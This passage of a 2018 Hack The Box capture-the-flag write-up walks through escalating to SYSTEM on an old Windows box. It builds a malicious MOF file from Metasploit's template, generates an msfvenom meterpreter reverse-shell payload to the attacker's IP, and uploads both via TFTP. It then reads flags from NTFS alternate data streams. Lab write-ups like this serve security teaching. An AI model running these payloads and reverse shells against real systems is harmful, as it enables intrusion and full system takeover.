+<a href="https://www.rapid7.com/db/modules/exploit/windows/fileformat/ms15_020_shortcut_icon_dllloader">MS15-020</a>
+and
+<a href="https://www.rapid7.com/db/modules/exploit/windows/fileformat/cve_2017_8464_lnk_rce">CVE-2017-8464</a>,
+all available in Metasploit for your convenience.</p>
+
+<p>As an example, let&rsquo;s have a closer look at the first of these vulnerabilities,
+as described <a href="http://www.geoffchappell.com/notes/security/stuxnet/ctrlfldr.htm">here</a>.
+Basically, the trick is to create an LNK file pointing to a CPL file. CPL files
+are components of the <a href="https://en.wikipedia.org/wiki/Control_Panel_(Windows)">Windows Control
+Panel</a>. Each control
+panel item is represented by a <a href="https://support.microsoft.com/en-nz/help/149648/description-of-control-panel-cpl-files">CPL
+file</a>
+living in the system folder. Is is possible for 3rd parties to add control
+panel items by adding files.</p>
+
+<p>To know which icon should be used to display the shortcut, the control panel
+asks the CPL file. For that to work, it seems as if the control panel loads the
+CPL to let it decide which item to use by executing code (sounds crazy, but
+that&rsquo;s what the blog posts say :D). If you craft the CPL file accordingly, you
+can execute anything.</p>
+
+<p>So I went on to generate some of these files and put them onto the box to
+different places, e.g., the Administrator&rsquo;s Desktop, hoping there would be some
+script simulating a user browsing the files. However, there is none. This
+strategy did not work.</p>
+
+<h2 id="ms10-061-and-mof-files-will-work">MS10-061 and MOF files - will work</h2>
+
+<p>Once unsuccessfully littering the box with LNK files frustrated me enough,
+I took a break and just read some nice Stuxnet articles to calm
+down a bit. This actually points to the right solution eventually. To see
+how, check out this
+<a href="https://poppopret.blogspot.com/2011/09/playing-with-mof-files-on-windows-for.html">article</a>
+or read my short summary:</p>
+
+<p>Another way Stuxnet got into a system was by exploiting a vulnerability in the
+Printer spooler. Many descriptions say it can be exploited to remotely execute
+code on the machine. These descriptions leave out a small but important detail
+thought. The Printer spooler does not execute code, it writes files. The
+interesting part is how Stuxnet uses that ability to execute code.</p>
+
+<p>Windows has something called <a href="https://docs.microsoft.com/en-us/windows/desktop/wmisdk/about-wmi">Windows Management
+Instrumentation</a>
+(WMI), which is a facility to manage Windows machines with scripts. You can
+react to all sorts of system events, like when a specific log file is written
+to. Since Stuxnet, it is frequently abused for all sorts of things (BlackHat
+presentation <a href="https://www.blackhat.com/docs/us-15/materials/us-15-Graeber-Abusing-Windows-Management-Instrumentation-WMI-To-Build-A-Persistent%20Asynchronous-And-Fileless-Backdoor-wp.pdf">here</a>).
+The relevant part for this box is that you can create a &ldquo;script&rdquo; as a MOF file,
+put it into a special folder, and Windows will execute it. This is usually
+not that big of a problem as only Administrators can write to that folder. We
+can use this feature to get a shell.</p>
+
+<p>Inspecting the original Metasploit exploit <a href="https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/smb/ms10_061_spoolss.rb">source
+code</a>,
+we can see that it includes a module <code>Msf::Exploit::WbemExec</code> to load a function
+<code>generate_mof</code>. The module source lives
+<a href="https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/core/exploit/wbemexec.rb">here</a>
+and it basically is a template for a MOF file executing an EXE and cleaning up
+after itself. Copy that file, open it with vim, fix the formatting and replace
+the various placeholders:</p>
+
+<ul>
+<li><code>:%s/\\\\/\\/g</code> to unescape backslashes</li>
+<li><code>:%s/@EXE@/bad.exe/g</code> to tell it to execute a file &ldquo;bad.exe&rdquo;, which we will
+have to put to &ldquo;C:\Windows\system32\bad.exe&rdquo;</li>
+<li><code>:%s/#{mofname}/bad.mof/g</code> to tell it the MOF file will be at
+&ldquo;C:\WINDOWS\system32\wbem\mof\bad.mof&rdquo;, allowing the MOF to later delete
+itself and the payload.</li>
+<li><code>:%s/@CLASS@/buzz/g</code> to give the class triggering the execution an arbitrary
+name (the trick of the MOF file is to define and instantiate a class along
+with a listener for an instantiation event which then triggers code execution.
+See
+<a href="https://poppopret.blogspot.com/2011/09/playing-with-mof-files-on-windows-for.html">here</a>
+for details how to build such files, but use the Metasploit version as the one
+from the article uses VBScript, not JScript, which seems to not work on the
+box)</li>
+</ul>
+
+<p>Now we have a &ldquo;bad.mof&rdquo; file and are ready to go. The rest is easy. Build a
+payload:</p>
+<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><code class="language-console" data-lang="console"><span></span> $ msfvenom -p windows/meterpreter/reverse_tcp <span style="color: #f8f8f2">LHOST</span><span style="color: #f92672">=</span><span style="color: #ae81ff">10</span>.10.15.147 <span style="color: #f8f8f2">LPORT</span><span style="color: #f92672">=</span><span style="color: #ae81ff">443</span> -f exe -o bad.exe
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder or badchars specified, outputting raw payload
+Payload size: 341 bytes
+Final size of exe file: 73802 bytes
+Saved as: bad.exe
+</code></pre></div>
+
+<p>Then upload the payload first, followed by the MOF file:</p>
+<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><code class="language-console" data-lang="console"><span></span> $ tftp <span style="color: #ae81ff">10</span>.10.10.90
+tftp&gt; binary
+tftp&gt; put bad.exe /WINDOWS/system32/bad.exe
+Sent 73802 bytes in 8.7 seconds
+tftp&gt; put bad.mof /WINDOWS/system32/wbem/mof/bad.mof
+Sent 707 bytes in 0.2 seconds
+</code></pre></div>
+
+<p>Finally, catch a meterpreter session and be system (start this handler before
+uploading &ldquo;bad.mof&rdquo;!):</p>
+<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><code class="language-console" data-lang="console"><span></span>msf &gt; use exploit/multi/handler
+msf exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp
+payload =&gt; windows/meterpreter/reverse_tcp
+msf exploit(multi/handler) &gt; set LHOST 10.10.15.147
+LHOST =&gt; 10.10.15.147
+msf exploit(multi/handler) &gt; set LPORT 443
+LPORT =&gt; 443
+msf exploit(multi/handler) &gt; run
+
+[*] Started reverse TCP handler on 10.10.15.147:443
+[*] Sending stage (179779 bytes) to 10.10.10.90
+[*] Meterpreter session 1 opened (10.10.15.147:443 -&gt; 10.10.10.90:1426) at 2018-10-14 16:50:15 -0400
+
+meterpreter &gt; getuid
+Server username: NT AUTHORITY\SYSTEM
+</code></pre></div>
+
+<p>If things don&rsquo;t work as expected, check the MOF compilation logs for errors.
+You can get them with TFTP like so:</p>
+<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><code class="language-console" data-lang="console"><span></span>tftp&gt; get /WINDOWS/system32/wbem/Logs/mofcomp.log
+Received 15235 bytes in 1.8 seconds
+</code></pre></div>
+
+<p>A working MOF file should produce this two entries:</p>
+<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><code class="language-console" data-lang="console"><span></span>(Sun Oct 14 22:46:26 2018.114724390) : Parsing MOF file: C:\WINDOWS\system32\wbem\mof\bad.mof
+(Sun Oct 14 23:17:35 2018.116593562) : Finished compiling file:C:\WINDOWS\system32\wbem\mof\bad.mof
+</code></pre></div>
+
+<p>Any mistake in the MOF file causes the logs to look like below. For instance,
+this happens if you use the VBScript-based MOF file described in the article
+above.</p>
+<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><code class="language-console" data-lang="console"><span></span>(Sun Oct 14 22:46:26 2018.114724390) : Parsing MOF file: C:\WINDOWS\system32\wbem\mof\bad.mof
+(Sun Oct 14 22:46:26 2018.114724406) : An error occurred while processing item 4 defined on lines 22 - 26 in file C:\WINDOWS\system32\wbem\mof\bad.mof:
+(Sun Oct 14 22:46:26 2018.114724406) : Error Number: 0x80010117, Facility: RPC
+Description: Call context cannot be accessed after call completed.
+</code></pre></div>
+
+<h1 id="getting-the-flag-from-ads">Getting the flag from ADS</h1>
+
+<p>Even though you are system already, the is one tiny little step left to get the
+flag. If you try to read it in a shell session, you get this:</p>
+<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><code class="language-console" data-lang="console"><span></span>C:\Documents and Settings\Administrator\Desktop&gt;type root.txt
+type root.txt
+It&#39;s easy, but not THAT easy...
+</code></pre></div>
+
+<p>Obviously, the flag cannot be here since TFTP would have been enough to just
+get it. But there is a &ldquo;flags&rdquo; directory, in which you see an interesting file:</p>
+<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><code class="language-console" data-lang="console"><span></span>C:\Documents and Settings\Administrator\Desktop\flags&gt;type &quot;2 for the price of 1!.txt&quot;
+type &quot;2 for the price of 1!.txt&quot;
+For limited time only!
+
+Keep an eye on our ADS for new offers &amp; discounts!
+</code></pre></div>
+
+<p>ADS refers to <a href="https://docs.microsoft.com/en-us/windows/desktop/fileio/file-streams">Alternative Data
+Streams</a>,
+a feature of NTFS that is sometimes abused to hide data (see this
+<a href="https://blog.malwarebytes.com/101/2015/07/introduction-to-alternate-data-streams/">article</a>).
+They are easy to read with the right tools. One of them is called
+<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/streams">streams</a>
+and is part of the Sysinternals suite. Download it to your machine, then upload
+it to the box with meterpreter (or download with
+<a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/certutil">certutil</a>
+if you chose a plain CMD session as payload). Now you can read the stream
+names, which are the flags:</p>
+<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><code class="language-console" data-lang="console"><span></span>C:\Documents and Settings\Administrator\Desktop\flags&gt;streams -accepteula -s .
+streams -accepteula -s .
+
+streams v1.60 - Reveal NTFS alternate streams.
+Copyright (C) 2005-2016 Mark Russinovich
+Sysinternals - www.sysinternals.com
+
+C:\Documents and Settings\Administrator\Desktop\flags\2 for the price of 1!.txt:
+   :root_txt_&lt;root-flag-here&gt;:$DATA     5
+   :user_txt_&lt;user-flag-here&gt;:$DATA     5
+</code></pre></div>
+
+<p>Just for completeness, here is how you could read the stream data if the flags
+had been stored inside:</p>
+<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><code class="language-console" data-lang="console"><span></span>C:\Documents and Settings\Administrator\Desktop\flags&gt;more &lt; &quot;2 for the price of 1!.txt:root_txt_&lt;root-flag-here&gt;&quot;
+more &lt; &quot;2 for the price of 1!.txt:root_txt_&lt;root-flag-here&gt;&quot;
+&quot;&quot;
+</code></pre></div>
+
+<h1 id="references">References</h1>
+
+<ul>
+<li>Interesting blog posts that explain in great detail how MOF files are
+written, what WMI is and how they fit in to the bigger picture are
+<a href="https://poppopret.blogspot.com/2011/09/playing-with-mof-files-on-windows-for.html">here</a>
+and <a href="https://countuponsecurity.com/tag/malicious-mof-file/">here</a>.</li>
+<li>Although it does not work here, the LNK based vulnerabilities are still
+interesting. Nice articled with more details are
+<a href="http://ith4cker.com/content/uploadfile/201804/44eb1522835054.pdf">here</a> and
+<a href="http://www.geoffchappell.com/notes/security/stuxnet/ctrlfldr.htm">here</a>.</li>
+</ul>
+
+    </div>
+    
+    <footer>
+      <hr>
+      <p>
+  Published
+  
+    
+      by <span itemprop="author">Dominic Breuker</span>
+    
+  
+  <time itemprop="datePublished" datetime="2018-11-03T00:00:00&#43;01:00">
+    3 Nov, 2018
+  </time>
+  
+    in <span itemprop="articleSection"><a href="/categories/hackthebox/">hackthebox</a></span>
+  
+  
+    and tagged <a href="/tags/ctf/">ctf</a>, <a href="/tags/hackthebox/">hackthebox</a>, <a href="/tags/infosec/">infosec</a> and <a href="/tags/write-up/">write-up</a>
+  
+  using <span itemprop="wordCount">2025</span> words.
+</p>
+
+      
+
+
+  <aside>
+    <header>Related Content</header>
+    <ul>
+      
+        <li><a href="/post/htb_devoops/">Hack The Box Write-up - DevOops</a>
+        <time datetime="7M">7 minutes</time>
+      
+        <li><a href="/post/htb_sunday/">Hack The Box Write-up - Sunday</a>
+        <time datetime="8M">8 minutes</time>
+      
+        <li><a href="/post/htb_solidstate/">Hack The Box Write-up - SolidState</a>
+        <time datetime="12M">12 minutes</time>
+      
+        <li><a href="/post/htb_calamity/">Hack The Box Write-up - Calamity</a>
+        <time datetime="10M">10 minutes</time>
+      
+        <li><a href="/post/flaws_cloud_2/">flaws.cloud - Level 2</a>
+        <time datetime="8M">8 minutes</time>
+      
+        <li><a href="/post/stego_book_of_secrets/">Steganography challenge - The Book of Secrets</a>
+        <time datetime="10M">10 minutes</time>
+      
+    </ul>
+  </aside>
+
+
+    </footer>
+  </article>
+</main>
+    <footer>
+  
+
+</footer>
+  </body>
+</html>
